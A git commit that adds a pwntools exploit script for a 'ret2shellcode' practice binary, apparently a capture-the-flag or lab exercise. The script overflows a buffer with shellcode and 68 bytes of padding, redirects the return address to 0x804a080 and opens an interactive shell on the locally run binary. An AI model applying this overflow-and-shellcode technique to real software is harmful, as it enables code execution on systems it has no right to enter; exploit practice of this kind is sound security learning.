4b2fc301841e12a7908f78cbd7941b068de0e51c
张靖昆 <55184183+tobbykun@users.noreply.github.com>
2023-11-19 13:41:42 +0800

    Update payload.py

--- ret2shellcode/payload.py
+++ ret2shellcode/payload.py
@@ -1,1 +1,7 @@
+from pwn import *
 
+sh = process(["qemu-i386",'./ret2shellcode'])
+shellcode = asm(shellcraft.sh())
+buf2_add = 0x804a080
+sh.sendline(flat(shellcode, b'a' * 68, p32(buf2_add)))
+sh.interactive()
